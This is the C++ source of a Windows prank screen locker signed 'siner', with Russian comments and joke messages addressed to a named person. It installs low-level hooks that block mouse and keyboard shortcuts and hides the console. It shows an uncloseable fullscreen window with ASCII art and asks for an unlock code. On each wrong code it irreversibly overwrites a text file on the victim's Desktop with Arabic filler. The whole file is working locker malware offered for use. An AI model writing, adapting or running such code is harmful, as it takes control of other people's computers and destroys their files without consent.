#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <fstream>
#include <shlobj.h>   // для Desktop

// Мемные фразы + ASCII-арт кошечки-горничной
std::vector<std::wstring> memes = {
    L"             .-.\n"
    L"             -- ::-.-@@@-  :.  .:::::\n"
    L"        ::::: =    .@@@@@@@@@#:       =\n"
    L"      ::    -:-+     .@@@@@@@@@@     --\n"
    L"      =. *..   -=          .=%@@     +\n"
    L"      -: --                         -:\n"
    L"      .-   ::.                      -\n"
    L"       +     .-.-       .-.:-      :\n"
    L"       .+   .+ =@@     .@@+ .+    +\n"
    L"       ---  =  @@@     *@@#  +   -=*\n"
    L"       --  .   :#: .  . ++  .    :-\n"
    L"        :*        :::::          -+      :\n"
    L"        -=..                 .....-     -=:-\n"
    L"            +#*=:=++     *@++*%@#.      =.  --\n"
    L"           @@@@@@:@@@@@@@@=@@@@@@@-  +=.+    :=\n"
    L"         =@@@@@@@ @@+ %@@ :@@@@@@@@  + .      :=\n"
    L"        :@@@@@@@@ -.   :: @@@@@@@@@ -:         =.\n"
    L"         %@@@@@@@  .:::. .@@@@@@@@=--          :-\n"
    L"          .#++=-=+       *=+@@@@%.-.           .-\n"
    L"            *    +*.::::=:  . +=:              -:\n"
    L"            ::    *---:*-     @@@-             +\n"
    L"            :#    .=  -:     =-@@@@=          =\n"
    L"          :@%.+    -.:-     +.#@@@@@@:      :=\n"
    L"         %@@@- +    *=     +. @@@@@@@@+ :::-:\n"
    L"        @@@@@   --  +    :=   =@@@@@@@@#++\n"
    L"       @@@@@@@##: .....::  +#@@@@@@@@@@+=\n"
    L"      *+@@@@@@@@@-   ##: .%@@@@@@@@@%#:.\n"
    L"       ..**@@@@@@@@@@@@@@@@@@@@@@#*:::\n"
    L"          ..=-=%@@@@@@@@@@@%+++:::\n"
    L"              :-     .:        +:\n"
    L"               @#+=+*@%---::::+=\n"
    L"               @@@@@@@@@@@@@@@@\n"
    L"               @@@@@@@@@@@@@@@\n"
    L"               +@@@@@@@@@@@@@:\n"
    L"                @@@@@@@@@@@@=\n"
    L"                @@@@@@@@@@@+\n"
    L"                 @@@@@@@@@#\n"
    L"                  @@@@@@@@\n"
    L"                   =@@@@@\n"
    L"                    *@@@\n\n"
    L"СИСТЕМА ЗАБЛОКИРОВАНА\n\nПавел, привет! Я тут живу теперь.",

    L"Мышь и клавиатура заблокированы.\nПопробуй нажать Alt+F4... Я подожду.\n\n- siner",
    L"Win+M не работает. И Win+Tab тоже.\n\n- siner",
    L"Даже диспетчер задач не вызовешь.\n\n- siner",
    L"Я заблокировал твою мышку. Кликать бесполезно.\n\n- siner",
    L"Чтобы выйти, жми Ctrl+Alt+Del.\nНу или выключи виртуалку.\n\n- siner",
    L"Обнаружено 999+ вирусов. Все хотят обниматься.\n\n- siner",
    L"Твой компьютер теперь мой. Шутка.\n\n- siner"
};

HHOOK keyboardHook;
HHOOK mouseHook;
HWND mainHwnd;
HWND hEdit = NULL;
HWND hButton = NULL;
HWND hLabel = NULL;
std::wstring current_meme = memes[0];

const wchar_t* CORRECT_CODE = L"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";

// Арабский текст для "кодирования" файла
const wchar_t* ARABIC_GARBAGE =
L"تم تشفير هذا الملف بواسطة siner 😈\n"
L"النظام مقفل. حاول مرة أخرى.\n"
L"هذا النص غير مفهوم عمداً.\n"
L"ملف مشفر — لا تحاول فتحه.\n"
L"سـيـنـر كـان هـنـا\n"
L"████████████████████████████████\n"
L"عربـي غـيـر مـفـهـوم ٠١٢٣٤٥٦٧٨٩\n"
L"تم تشفير المحتوى. النظام مغلق.";

// --- ПЕРЕХВАТ КЛАВИАТУРЫ (без изменений логики блокировки) ---
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            bool altPressed = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
            bool ctrlPressed = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
            bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) return 1;
            if (altPressed && p->vkCode == VK_F4) return 1;
            if (ctrlPressed && shiftPressed && p->vkCode == VK_ESCAPE) return 1;
            if (altPressed && p->vkCode == VK_TAB) return 1;
            if (ctrlPressed && p->vkCode == VK_ESCAPE) return 1;
            if (p->vkCode == VK_TAB || p->vkCode == VK_SPACE) return 1;

            // Enter — отправляем сообщение на проверку кода (чтобы работало без мыши)
            if (p->vkCode == VK_RETURN) {
                PostMessage(mainHwnd, WM_USER + 1, 0, 0);
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// --- ПЕРЕХВАТ МЫШИ (полностью как было) ---
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        return 1; // Блокируем клики и движение
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

// Кодируем (перезаписываем) один файл арабским текстом
void EncodeRandomFile() {
    wchar_t desktop[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop))) {
        // fallback
        GetTempPathW(MAX_PATH, desktop);
    }

    std::wstring search = std::wstring(desktop) + L"\\*.txt";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(search.c_str(), &fd);

    std::wstring targetFile;
    if (hFind != INVALID_HANDLE_VALUE) {
        // Берём первый найденный .txt на рабочем столе
        targetFile = std::wstring(desktop) + L"\\" + fd.cFileName;
        FindClose(hFind);
    }
    else {
        // Если нет txt — создаём новый файл
        targetFile = std::wstring(desktop) + L"\\siner_encoded_файл.txt";
    }

    // Перезаписываем арабским
    HANDLE hFile = CreateFileW(targetFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        // Пишем UTF-16 LE с BOM
        WORD bom = 0xFEFF;
        DWORD written;
        WriteFile(hFile, &bom, sizeof(bom), &written, NULL);
        WriteFile(hFile, ARABIC_GARBAGE, (DWORD)(wcslen(ARABIC_GARBAGE) * sizeof(wchar_t)), &written, NULL);
        CloseHandle(hFile);
    }
}

// Проверка кода
void CheckCode() {
    if (!hEdit) return;

    wchar_t buf[256] = { 0 };
    GetWindowTextW(hEdit, buf, 255);

    if (wcscmp(buf, CORRECT_CODE) == 0) {
        // Правильный код — закрываем процесс
        UnhookWindowsHookEx(keyboardHook);
        UnhookWindowsHookEx(mouseHook);
        ShowCursor(TRUE);
        PostQuitMessage(0);
        // на всякий
        ExitProcess(0);
    }
    else {
        // Неверный — кодируем файл
        EncodeRandomFile();
        // Можно обновить мем, чтобы показать, что что-то произошло
        current_meme = L"НЕВЕРНЫЙ КОД!\n\nОдин из твоих файлов\nтеперь на арабском 😈\n\nПопробуй ещё раз...";
        InvalidateRect(mainHwnd, NULL, TRUE);
    }
}

// Поток для смены мемов
void meme_updater() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, memes.size() - 1);

    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        // Не меняем мем, если сейчас показывается сообщение об ошибке
        if (current_meme.find(L"НЕВЕРНЫЙ КОД") == std::wstring::npos) {
            current_meme = memes[dis(gen)];
            InvalidateRect(mainHwnd, NULL, TRUE);
            UpdateWindow(mainHwnd);
        }
    }
}

// Оконная процедура
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &ps.rcPaint, blackBrush);
        DeleteObject(blackBrush);

        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 0, 0));

        // Моноширинный шрифт для ASCII
        HFONT hFont = CreateFont(15, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            FIXED_PITCH | FF_MODERN, TEXT("Consolas"));
        if (!hFont) {
            hFont = CreateFont(15, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                FIXED_PITCH, TEXT("Courier New"));
        }
        SelectObject(hdc, hFont);

        RECT rect;
        GetClientRect(hwnd, &rect);
        // Оставляем место внизу под UI (~140 px)
        rect.bottom -= 140;
        rect.top += 10;
        DrawText(hdc, current_meme.c_str(), -1, &rect, DT_CENTER | DT_TOP | DT_WORDBREAK);

        DeleteObject(hFont);
        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_COMMAND: {
        if (LOWORD(wParam) == 1001) { // ID кнопки
            CheckCode();
        }
        return 0;
    }

    case WM_USER + 1: { // Enter из хука
        CheckCode();
        return 0;
    }

    case WM_CLOSE:
        return 0; // Не даём закрыть
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);

    if (keyboardHook == NULL || mouseHook == NULL) {
        MessageBox(NULL, L"Не удалось установить перехватчики.", L"Ошибка", MB_ICONERROR);
        return 1;
    }

    const wchar_t CLASS_NAME[] = L"LockerClass";
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClass(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    mainHwnd = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        CLASS_NAME, L"LOCKED",
        WS_POPUP,
        0, 0, screenW, screenH,
        NULL, NULL, hInstance, NULL
    );

    if (mainHwnd == NULL) return 0;

    // --- UI элементы внизу ---
    int uiY = screenH - 120;
    int centerX = screenW / 2;

    // Надпись
    hLabel = CreateWindowW(
        L"STATIC", L"Ваш текст здесь",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        centerX - 200, uiY, 400, 25,
        mainHwnd, NULL, hInstance, NULL
    );

    // Текстбокс
    hEdit = CreateWindowW(
        L"EDIT", L"код здесь",
        WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL | ES_CENTER,
        centerX - 220, uiY + 30, 300, 28,
        mainHwnd, (HMENU)1002, hInstance, NULL
    );

    // Кнопка
    hButton = CreateWindowW(
        L"BUTTON", L"нажать",
        WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
        centerX + 90, uiY + 28, 100, 32,
        mainHwnd, (HMENU)1001, hInstance, NULL
    );

    // Делаем текст лейбла красным
    // (для STATIC это сложнее, просто оставим системный)

    ShowCursor(FALSE);
    ShowWindow(mainHwnd, SW_SHOW);
    UpdateWindow(mainHwnd);

    // Фокус на поле ввода
    SetFocus(hEdit);

    std::thread updater(meme_updater);
    updater.detach();

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
    ShowCursor(TRUE);
    return 0;
}
